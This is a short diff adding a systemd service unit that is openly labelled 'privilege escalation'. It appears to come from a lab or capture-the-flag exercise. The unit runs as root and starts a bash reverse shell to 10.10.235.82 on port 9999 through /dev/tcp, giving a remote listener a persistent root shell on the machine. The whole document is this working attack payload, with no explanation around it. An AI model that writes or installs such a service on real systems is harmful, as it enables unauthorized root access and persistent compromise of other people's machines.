@@ -1,0 +1,10 @@
+[Unit]
+Description=privilege escalation
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.235.82/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
